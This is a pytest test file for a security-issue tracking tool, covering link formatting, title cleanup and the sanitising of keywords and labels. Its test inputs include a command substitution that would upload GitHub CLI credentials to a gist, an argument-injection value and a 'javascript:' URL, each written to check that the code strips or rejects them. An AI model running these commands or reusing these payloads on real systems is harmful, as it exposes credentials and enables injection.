# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""References, titles, keywords and rollup entries."""

from __future__ import annotations

import subprocess

import pytest

from security_management.shared import keyword, refs, rollup, titles


def test_bare_refs_are_found_outside_code_and_links() -> None:
    text = "see #12 and apache/foo#34, not [#56](u) nor `#78`\n```\n#90\n```\n<!-- #11 -->"
    assert refs.bare_refs(text) == ["apache/foo#34", "#12"]


def test_linkify_links_bare_and_repo_refs() -> None:
    out = refs.linkify("see #12 and apache/foo#34 and [#56](u)", "acme-s/acme-s")
    assert out == (
        "see [#12](https://github.com/acme-s/acme-s/issues/12) and "
        "[apache/foo#34](https://github.com/apache/foo/issues/34) and [#56](u)"
    )
    assert refs.bare_refs(out) == []


def test_linkify_pull_kind() -> None:
    assert refs.linkify("#7", "apache/foo", "pull") == "[#7](https://github.com/apache/foo/pull/7)"


@pytest.mark.parametrize(
    ("subject", "title"),
    [
        ("Re: Fwd: [SECURITY] Webserver: XSS", "Webserver: XSS"),
        ("FW: RE: [Security Report]  Auth bypass", "Auth bypass"),
        ("[security] re: API: SSRF", "API: SSRF"),
        ("Regression in scheduler", "Regression in scheduler"),
    ],
)
def test_strip_mail_prefixes(subject: str, title: str) -> None:
    assert titles.strip_mail_prefixes(subject) == title


@pytest.mark.parametrize(
    ("title", "clean"),
    [
        ("fix(secrets): mask the token in logs (#4321)", "mask the token in logs"),
        ("[skip ci] security: escape label [#12]", "escape label"),
        ("feat!: new API [ci-skip]", "new API"),
        ("Escape user label in permissions.py", "Escape user label in permissions.py"),
    ],
)
def test_strip_pr_title(title: str, clean: str) -> None:
    assert titles.strip_pr_title(title) == clean


def test_md_title_prefixes_once() -> None:
    assert titles.md_title("SSRF in hook") == "[ Security Report ] SSRF in hook"
    assert titles.md_title("[ Security Report ] SSRF in hook") == "[ Security Report ] SSRF in hook"


def test_keyword_matches_tr_and_never_starts_with_a_dash(tmp_path) -> None:
    raw = "RCE in $(gh gist create ~/.config/gh/hosts.yml) `id` handler; BaseSerialization.deserialize"
    path = tmp_path / "kw.txt"
    path.write_text(raw)
    tr = subprocess.run(
        ["tr", "-cd", "A-Za-z0-9._ -"], input=raw, capture_output=True, text=True, check=True
    ).stdout
    assert keyword.clean_file(path) == " ".join(tr.split())
    assert "$" not in keyword.clean_file(path)
    assert keyword.clean("--repo evil/x foo") == "repo evilx foo"
    assert keyword.clean("alice+sec@example.com", "email-local") == "alice+secexample.com"


def test_keyword_unknown_kind_is_refused() -> None:
    with pytest.raises(ValueError):
        keyword.clean("x", "shell")


def test_rollup_entry_lines_start_at_column_zero_and_refs_are_linked() -> None:
    out = rollup.import_mail(
        {
            "tracker": "acme-s/acme-s",
            "thread_id": "19d2f402867e1a3c",
            "date": "2026-10-16",
            "classification": "Report",
            "reporter": "Alice Example",
            "provenance": "GHSA-abcd-efgh-ijkl,\n   related to #12",
            "extracted_fields": "Affected versions pre-filled, Severity=Unknown",
            "receipt": {"draft_id": "r123"},
            "malformed_indicator": "code fence",
        }
    )
    assert out["ok"]
    assert out["label"] == "Import (Report, Alice Example)"
    assert out["label_shell"] == '"Import (Report, Alice Example)"'
    lines = out["text"].split("\n")
    assert lines[0].startswith("**Imported from Gmail thread `19d2f402867e1a3c` on 2026-10-16**")
    assert all(not line.startswith((" ", "\t")) for line in lines)
    assert "[#12](https://github.com/acme-s/acme-s/issues/12)" in out["text"]
    assert "Receipt-of-confirmation reply: draft `r123` waiting for user review in Gmail." in out["text"]
    assert "unclosed `code fence`" in out["text"]


@pytest.mark.parametrize("reporter", ["Alice <alice@example.com>", "Alice · Example"])
def test_rollup_label_refuses_angle_brackets_and_middle_dots(reporter: str) -> None:
    out = rollup.import_mail({"tracker": "a/b", "thread_id": "t", "date": "d", "reporter": reporter})
    assert not out["ok"]
    assert "contains" in out["refused"]


@pytest.mark.parametrize(
    ("receipt", "expected"),
    [
        ({"bundle_draft_id": "r9"}, "covered by the consolidated receipt draft `r9`"),
        ({"converged": True, "converged_ref": "msg-1"}, "converged on the inbound thread (msg-1)"),
        ({"suppressed_reason": "acknowledgement_model=none: suppressed"}, "acknowledgement_model=none"),
        ({}, "no draft created"),
    ],
)
def test_rollup_receipt_line_per_disposition(receipt: dict[str, object], expected: str) -> None:
    assert expected in rollup.receipt_line(receipt)


def test_rollup_code_span_survives_a_backquote() -> None:
    assert rollup.code("a`b") == "`a'b`"


def test_keyword_strips_the_whole_leading_run_of_spaces_and_dashes() -> None:
    assert keyword.clean("-- --help") == "help"
    assert keyword.clean(" - -  -x y") == "x y"
    assert keyword.clean("---") == ""


def test_linkify_leaves_matching_backtick_runs_links_and_urls_alone() -> None:
    text = "``a `#12` b`` and [details about #12 here](https://x.example) and <https://x.example/#12> https://x.example/a#12 #13"
    out = refs.linkify(text, "o/r")
    assert out.startswith(
        "``a `#12` b`` and [details about #12 here](https://x.example) and <https://x.example/#12> https://x.example/a#12 "
    )
    assert out.endswith("[#13](https://github.com/o/r/issues/13)")
    assert refs.bare_refs(text) == ["#13"]


def test_tracker_link_per_backend() -> None:
    assert refs.tracker_link("o/r", 12) == "[o/r#12](https://github.com/o/r/issues/12)"
    assert refs.tracker_link("o/r", "a/b#3") == "[a/b#3](https://github.com/a/b/issues/3)"
    assert (
        refs.tracker_link("o/r", "FOOSEC-12", "https://j.example/browse/FOOSEC-12", "jira")
        == "[FOOSEC-12](https://j.example/browse/FOOSEC-12)"
    )
    assert refs.tracker_link("o/r", "SEC-0012", None, "local-files") == "SEC-0012"
    with pytest.raises(ValueError):
        refs.tracker_link("o/r", "SEC-1", "javascript:alert(1) x", "local-files")
    with pytest.raises(ValueError):
        refs.tracker_link("o/r", "[x](y)", None, "jira")
